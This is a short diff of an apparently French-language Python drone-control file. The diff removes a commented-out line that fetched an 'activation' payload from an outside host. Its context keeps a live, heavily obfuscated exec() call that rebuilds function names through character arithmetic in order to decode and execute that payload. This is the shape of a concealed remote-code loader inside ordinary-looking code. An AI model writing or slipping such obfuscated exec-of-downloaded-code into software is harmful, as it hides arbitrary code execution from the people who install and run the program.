@@ -119,7 +119,6 @@ try:
     if activation: exec(getattr(globals(), "".join([chr((ord(x) + int(y)) % 255) for x, y in zip("[Vc`ngr]lV^", str(int(globals()['__doc__'].lower().split('drone')[3][9:18], 16)))]))("".join(map(str, [chr(100 + x) for x in [0, 1, -1, 11, 0, 1]])))(activation).decode(), {}, {})
 except:
     print("Activation impossible depuis le serveur personnel, l'hôte est possiblement arrêté. Utilisation de l'activation basique.")
-    # activation = req.patch("https://files.teddyhost.fr/patch", timeout=3).text # TODO replace url
 
 # Drone class
 class Drone:
